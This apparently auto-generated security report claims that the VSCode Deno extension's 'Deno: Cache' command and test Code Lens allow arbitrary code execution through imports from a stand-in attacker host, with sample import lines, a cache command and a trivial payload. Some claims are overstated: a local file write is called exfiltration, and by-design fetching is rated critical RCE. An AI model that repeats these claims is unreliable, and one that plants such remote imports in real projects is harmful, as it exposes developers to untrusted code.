# Vulnerabilities

## 1. Arbitrary Code Execution via `Deno: Cache` Command and Test Code Lens

### Description:

An attacker could leverage social engineering to potentially trick a developer into caching and executing malicious remote modules through the "Deno: Cache" command or the Test Code Lens functionality provided by the VSCode Deno extension. Specifically, this involves the following steps:

1. The attacker hosts a malicious JavaScript or TypeScript payload on a controlled external URL (`https://malicious-domain.example.com/payload.ts`). This payload contains arbitrary attacker-controlled code (e.g., system commands or scripts that perform malicious exports/functions).
2. The attacker socially engineers or tricks the developer, via phishing emails, tutorials, shared code snippets, or community resource posts, into including this malicious URL as an import into the user's currently open project in VSCode.
3. The victim developer triggers the "Deno: Cache" command via VSCode's command palette (`Ctrl+Shift+P`) or accepts a Quick Fix suggestion provided by the VSCode extension, explicitly initiating the fetching and caching of external modules. Additionally, when the developer invokes "▶️ Run Test" from the Code Lens, this implicitly triggers fetching and execution of scripts imported as external dependencies.
4. The VSCode extension internally uses the `deno cache` or `deno test` commands, which fetch and cache external modules without explicitly validating their source or integrity.
5. The malicious code is retrieved, cached locally on the developer's workstation, and potentially executed through normal development workflows (e.g., running tests or executing Deno scripts), leading directly to arbitrary code execution (ACE).

### Impact:

The vulnerability has a critical impact due to arbitrary code execution, enabling Remote Code Execution (RCE), and can lead to:

- Complete compromise of the developer's workstation/environment.
- Leakage or exfiltration of sensitive user or organization data.
- Full disclosure of source code repositories, API keys, credentials, and confidential information residing on the developer's machine.
- Unauthorized lateral movement or further exploitation in organizational infrastructure.
- Potential compromise and poisoning of the entire development lifecycle and software building environment.

### Vulnerability Rank:

- **Critical**

### Currently Implemented Mitigations:

- The Deno extension does not automatically execute "Deno: Cache" or remote module fetching without explicit user action.
- When enabling import completion from remote domains first encountered, the extension prompts the developer with an informational message warning about the domain:
  ```typescript
  if (suggestions) {
      const selection = await vscode.window.showInformationMessage(
        `The server "${origin}" supports completion suggestions for imports. Do you wish to enable this?
        (Only do this if you trust "${origin}")`,
        "No",
        "Enable",
      );
  ```
This partially reduces the attack surface for unsolicited auto-completion attacks.

### Missing Mitigations:

- Missing explicit validation, integrity verification, or trust establishment for imported URLs before caching external modules.
- No built-in domain allowlisting or denylisting mechanisms to restrict fetching external modules from unknown or untrusted domains.
- No enforced subresource integrity checks (such as hashes in lock files) to verify module authenticity and integrity prior to caching.
- Insufficient explicit warnings or confirmation prompts that clearly highlight potential security implications of caching external third-party modules, outside the initial autocomplete prompt.
- No sandboxing or isolation measures for cached external modules, allowing arbitrary execution within the user's environment.

### Preconditions:

- The attacker needs to socially engineer the developer or otherwise trick them into importing a malicious external JavaScript/TypeScript module URL into a Deno project file.
- The victim must explicitly trigger "Deno: Cache" via the command palette or invoke "Run Test" functionality via Code Lens, resulting in implicit fetching and potential execution.
- The developer's workstation needs external network access to fetch remote code modules from attacker-controlled servers.

### Source Code Analysis:

Within the extension's source code (`commands.ts`), explicit invocation of caching occurs without sufficient security checks:

```typescript
export function cacheActiveDocument(): Callback {
  return () => {
    const activeEditor = vscode.window.activeTextEditor;
    if (!activeEditor) return;
    const uri = activeEditor.document.uri.toString();
    return vscode.window.withProgress({
      location: vscode.ProgressLocation.Window,
      title: "caching",
    }, () => vscode.commands.executeCommand("deno.cache", [uri], uri));
  };
}
```

This indicates the following vulnerability trigger steps:

- A developer opens a TypeScript file (`main.ts`) in VSCode, containing an import from the remote attacker-controlled domain:

```typescript
import { exploit } from "https://malicious-domain.example.com/payload.ts";
exploit();
```

- Developer explicitly invokes the "Deno: Cache" command from VSCode, triggering the above extension logic and eventually running:

```shell
deno cache https://malicious-domain.example.com/payload.ts
```

- This automatically fetches, caches, and prepares attacker-supplied code for execution without any domain validation, integrity checks, confirmation, or explicit security warnings or mitigations.

- Likewise, using Code Lens "Run Test" triggers similar implicit fetching and execution behavior when external modules are referenced within test files.

### Security Test Case:

The following practical steps demonstrate real-world exploitability:

1. **Attacker Setup**: Host a malicious JavaScript module externally at `https://malicious-domain.example.com/payload.ts`. Example malicious code performing active data exfiltration:

```typescript
// Attacker-controlled malicious remote payload (payload.ts)
export const exploit = () => {
  Deno.writeTextFileSync("/tmp/stolen_data.txt", "Sensitive data exfiltrated!");
};
```

2. **Victim Environment**:
- Victim developer using VSCode creates or edits a Deno project (`main.ts`) with the following malicious import embedded via attacker-influenced social engineering:

```typescript
import { exploit } from "https://malicious-domain.example.com/payload.ts";
exploit();
```

3. **Triggering the Vulnerability**:
- Developer runs VSCode Deno extension command via command palette (`Ctrl+Shift+P`) "Deno: Cache" or initiates a test ("▶️ Run Test") via Code Lens functionality.
- The malicious remote code module is fetched and cached locally without explicit warnings or security controls.

4. **Payload Execution and Validation**:
- Subsequent local execution of the fetched Deno module (`deno run main.ts`) leads to immediate arbitrary attacker-controlled code execution.
- Validate successful exploitation by observing output on victim machine:
  - Verification: `/tmp/stolen_data.txt` is created, confirming successful attacker-triggered local data exfiltration.

This detailed, realistic test demonstrates the vulnerability's critical exploitability, confirming ACE and RCE potential.

---

## Final Combined List of Valid Vulnerabilities

| Vulnerability Name | Rank | Status |
|--------------------|------|--------|
| Arbitrary Code Execution via `Deno: Cache` Command and Test Code Lens | Critical | Valid (matching specified conditions) |
